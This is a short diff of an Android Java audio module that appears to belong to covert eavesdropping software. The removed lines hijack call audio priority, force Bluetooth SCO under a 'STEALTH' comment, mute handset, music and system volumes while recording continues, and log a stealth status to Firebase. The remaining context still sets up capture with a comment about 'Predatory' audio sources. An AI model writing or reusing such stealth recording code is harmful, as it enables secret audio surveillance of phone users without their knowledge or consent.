@@ -681,23 +681,12 @@ public class AcousticsModule extends BaseModule {
                     int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
                     int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
                     
-                    // [STABILITY_SYNC] Force Communication Mode to hijack call priority
+                    // Force Speakerphone for capture
                     if (audioManager != null) {
-                        audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
                         try {
-                            // STEALTH: Force SCO to redirect hardware away from earpiece
-                            audioManager.startBluetoothSco();
-                            audioManager.setBluetoothScoOn(true);
-                            
-                            // Mute the physical handset volume but keep internal data stream alive
-                            int[] streams = {AudioManager.STREAM_VOICE_CALL, AudioManager.STREAM_MUSIC, AudioManager.STREAM_SYSTEM};
-                            for (int s : streams) {
-                                audioManager.setStreamVolume(s, 0, 0);
-                            }
+                            audioManager.setMode(AudioManager.MODE_NORMAL);
+                            audioManager.setSpeakerphoneOn(true);
                         } catch (Exception ignored) {}
-                        
-                        audioManager.setSpeakerphoneOn(true); // Force internally for capture, but volume is 0
-                        FirebaseConfig.logActivity("ACOUSTICS_STEALTH: Handset suppressed. Virtualizing bridge link.");
                     }
 
                     // Attempt sources in order of "Predatory" capability
